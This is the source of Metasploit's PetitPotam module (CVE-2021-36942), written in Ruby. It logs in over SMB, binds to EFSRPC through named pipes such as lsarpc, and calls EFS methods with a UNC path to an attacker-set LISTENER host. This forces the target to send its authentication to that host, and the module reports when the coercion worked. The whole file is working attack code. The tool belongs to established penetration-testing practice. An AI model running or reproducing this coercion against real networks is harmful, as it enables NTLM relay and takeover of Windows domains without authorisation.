##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'windows_error'
require 'ruby_smb'
require 'ruby_smb/error'
require 'ruby_smb/dcerpc/lsarpc'
require 'ruby_smb/dcerpc/efsrpc'

class MetasploitModule < Msf::Auxiliary

  module EfsrpcOverLsarpc
    include RubySMB::Dcerpc::Efsrpc

    UUID = RubySMB::Dcerpc::Efsrpc::LSARPC_UUID
  end

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  METHODS = %w[EfsRpcOpenFileRaw EfsRpcEncryptFileSrv EfsRpcDecryptFileSrv EfsRpcQueryUsersOnFile EfsRpcQueryRecoveryAgents].freeze
  # The LSARPC UUID should be used for all pipe handles, except for the efsrpc one. For that one use
  # Efsrpc and it's normal UUID
  PIPE_HANDLES = {
    lsarpc: {
      endpoint: EfsrpcOverLsarpc,
      filename: 'lsarpc'.freeze
    },
    efsrpc: {
      endpoint: RubySMB::Dcerpc::Efsrpc,
      filename: 'efsrpc'.freeze
    },
    samr: {
      endpoint: RubySMB::Dcerpc::Lsarpc,
      filename: 'samr'.freeze
    },
    lsass: {
      endpoint: RubySMB::Dcerpc::Lsarpc,
      filename: 'lsass'.freeze
    },
    netlogon: {
      endpoint: RubySMB::Dcerpc::Lsarpc,
      filename: 'netlogon'.freeze
    }
  }.freeze

  def initialize
    super(
      'Name' => 'PetitPotam',
      'Description' => %q{
        Coerce an authentication attempt over SMB to other machines via MS-EFSRPC methods.
      },
      'Author' => [
        'GILLES Lionel',
        'Spencer McIntyre'
      ],
      'References' => [
        [ 'CVE', '2021-36942' ],
        [ 'URL', 'https://github.com/topotam/PetitPotam' ],
        [ 'URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451' ]
      ],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('LISTENER', [ true, 'The host listening for the incoming connection', Rex::Socket.source_address ]),
        OptEnum.new('PIPE', [ true, 'The named pipe to use for triggering', 'lsarpc', PIPE_HANDLES.keys.map(&:to_s) ]),
        OptEnum.new('METHOD', [ true, 'The RPC method to use for triggering', 'Automatic', ['Automatic'] + METHODS ])
      ]
    )
  end

  def run_host(_ip)
    begin
      connect
    rescue Rex::ConnectionError => e
      fail_with(Failure::Unreachable, e.message)
    end

    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
    end
    report_service(service_data)

    begin
      @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      raise StandardError, "Unable to connect to the remote IPC$ share ([#{e.class}] #{e})."
    end

    handle_args = PIPE_HANDLES[datastore['PIPE'].to_sym]
    fail_with(Failure::BadConfig, "Invalid pipe: #{datastore['PIPE']}") unless handle_args

    # rename tree_file
    @pipe = @tree.open_file(filename: handle_args[:filename], write: true, read: true)
    handle = dcerpc_handle(
      handle_args[:endpoint]::UUID,
      handle_args.fetch(:version, '1.0'),
      handle_args.fetch(:protocol, 'ncacn_np'),
      ["\\#{handle_args[:filename]}"]
    )
    vprint_status("Binding to #{handle} ...")
    @pipe.bind(
      endpoint: handle_args[:endpoint],
      auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
      auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
    )
    vprint_status("Bound to #{handle} ...")

    if datastore['METHOD'] == 'Automatic'
      methods = METHODS
    else
      methods = [datastore['METHOD']]
    end

    methods.each do |method|
      vprint_status("Attempting to coerce authentication via #{method}")
      response = efs_call(
        method,
        file_name: "\\\\#{datastore['LISTENER']}\\#{Rex::Text.rand_text_alphanumeric(4..8)}\\#{Rex::Text.rand_text_alphanumeric(4..8)}.#{Rex::Text.rand_text_alphanumeric(3)}"
      )
      if response.nil?
        unless method == methods.last
          # rebind if we got a DCERPC error (as indicated by no response) and there are more methods to try
          vprint_status("Rebinding to #{handle} ...")
          @pipe.close
          @pipe = @tree.open_file(filename: handle_args[:filename], write: true, read: true)
          @pipe.bind(
            endpoint: handle_args[:endpoint],
            auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
          )
        end

        next
      end

      error_status = response.error_status.to_i
      win32_error = ::WindowsError::Win32.find_by_retval(error_status).first
      case win32_error
      when ::WindowsError::Win32::ERROR_BAD_NETPATH
        # this should be the response even if LISTENER was inaccessible
        print_good('Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful')
        break
      when nil
        print_status("Server responded with unknown error: 0x#{error_status.to_s(16).rjust(8, '0')}")
      else
        print_status("Server responded with #{win32_error.name} (#{win32_error.description})")
      end
    end
  end

  def cleanup
    if @pipe
      @pipe.close
      @pipe = nil
    end

    if @tree
      @tree.disconnect!
      @tree = nil
    end

    super
  end

  def efs_call(name, **kwargs)
    request = RubySMB::Dcerpc::Efsrpc.const_get("#{name}Request").new(**kwargs)

    begin
      raw_response = @pipe.dcerpc_request(
        request,
        auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
      )
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      print_error "The #{name} Encrypting File System RPC request failed (#{e.message})."
      return nil
    end

    RubySMB::Dcerpc::Efsrpc.const_get("#{name}Response").read(raw_response)
  end

  def service_data
    {
      host: rhost,
      port: rport,
      host_name: simple.client.default_name,
      proto: 'tcp',
      name: 'smb',
      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
    }
  end
end
